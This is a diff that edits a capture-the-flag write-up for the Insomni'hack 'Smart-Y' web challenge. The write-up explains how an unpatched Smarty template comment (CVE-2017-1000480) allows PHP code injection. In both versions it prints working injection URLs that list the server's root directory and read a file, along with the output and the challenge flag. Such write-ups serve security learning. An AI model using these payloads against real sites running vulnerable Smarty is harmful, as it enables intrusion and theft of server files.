@@ -1,8 +1,9 @@
-
 # Smart-Y
-This challenge was the second most flagged web challenge.
+
+This challenge was the second most flagged Web challenge of the CTF.
 
 ## Description
+
 ```
 Last year, a nerd destroyed the system of Robot City by using some evident flaws. It seems that the system has changed and is not as evident to break now.
 http://smart-y.teaser.insomnihack.ch
@@ -10,15 +11,27 @@ http://smart-y.teaser.insomnihack.ch
 
 ## Recon
 
-The description talks about the previous challenge from Insomni'hack 2017. So we started by looking for the writeup of this challenge (`https://terryvogelsang.tech/insomnihack-2017-nerdwar/`). So from here, we suspect the website use the framework Smarty (confirmed by the challenge's name) and the sqli and the template injection may have been patched.
+The description evokes a previous challenge from Insomni'hack 2017. We
+therefore started by looking for the
+[writeup](https://terryvogelsang.tech/insomnihack-2017-nerdwar/) of this
+challenge. At this point, it seems likely that the website uses the Smarty
+framework - which is confirmed by the name of the challenge - and that the
+SQLi as well as the template injection from the previous edition have been
+patched.
 
-The tool `dirb` tells us that the directory `smarty` exists with the `changelog.txt` file:
+The output of `dirb` indicates that the **smarty** directory exists and contains
+the following **changelog.txt** file:
+
 ```
 ===== 3.1.31 ===== (14.12.2016)
   23.11.2016
    - move template object cache into static variables
 ```
-The fonctionnality vulnerable to sqli has been deactivated in the fetch function. However the display function is stills available:
+
+The functionality that was vulnerable to SQL injection through the fetch
+function before has been deactivated.
+However, the display function is still available:
+
 ```php
 <?php 
 
@@ -53,7 +66,13 @@ $smarty->registerResource('news',new news);
 $smarty->display('news:'.(isset($_GET['id']) ? $_GET['id'] : ''));  
 ```
 
-This version is vulnerable to the [CVE-2017-1000480](https://www.cvedetails.com/cve/CVE-2017-1000480/). uUfortunately,  there is no public exploit available. After digging, we identified the [commit](https://github.com/smarty-php/smarty/commit/614ad1f8b9b00086efc123e49b7bb8efbfa81b61) relative to the patch.
+This version of Smarty is vulnerable to
+[CVE-2017-1000480](https://www.cvedetails.com/cve/CVE-2017-1000480/).
+Unfortunately, we couldn't find any public exploit for it. After digging through
+the repository of Smarty, we identified the [commit](https://github.com/smarty-php/smarty/commit/614ad1f8b9b00086efc123e49b7bb8efbfa81b61)
+introducing a patch.
+
+
 The patch is the following:
 ```php
 -        $output .= "/* Smarty version " . Smarty::SMARTY_VERSION . ", created on " . strftime("%Y-%m-%d %H:%M:%S") .
@@ -62,14 +81,19 @@ The patch is the following:
 +                   "\n  from \"" . str_replace('*/','* /',$_template->source->filepath) . "\" */\n\n";
 ```
 
- The patch prevent us to close the comment with `*/`.
- So in the actual version we should be able to close the comment and injection our own code.
- Let's try
+The patch prevents the user from closing the comment with `*/`.
+Since the website uses a version of Smarty that doesn't contain this patch,
+was should be able to **close the comment and inject our own code**.
+
+Let's try it.
  
- ## Exploit
+## Exploit
  
- 1. Let's list the root directory: `http://smart-y.teaser.insomnihack.ch/console.php?id=*/var_dump(scandir(%27/%27));/*`
- ```
+1. We start by listing the root directory by visiting the following URL:
+`http://smart-y.teaser.insomnihack.ch/console.php?id=*/var_dump(scandir(%27/%27));/*`
+
+This outputs the following result:
+```
  array(28) {
   [0]=>
   string(1) "."
@@ -129,8 +153,17 @@ The patch is the following:
   string(11) "vmlinuz.old"
 }
 ```
-2. Print the flag: `http://smart-y.teaser.insomnihack.ch/console.php?id=*/var_dump(file_get_contents(%22/flag%22));/*`
+
+2. It worked! Now that we got the path to the flag, all that's left is to
+actually print it by visiting:
+`http://smart-y.teaser.insomnihack.ch/console.php?id=*/var_dump(file_get_contents(%22/flag%22));/*`.
+
+Aaaand, here's the flag:
 
 ```string(26) "INS{why_being_so_smart-y}```
 
-It was a really nice challenge which just require to read carefully the commit.
+## Conclusion
+
+Smart-Y was a really nice challenge, which mainly required to carefully read
+a patch. Funnily enough, it seems that the patch is not yet available in a
+stable Smarty release.
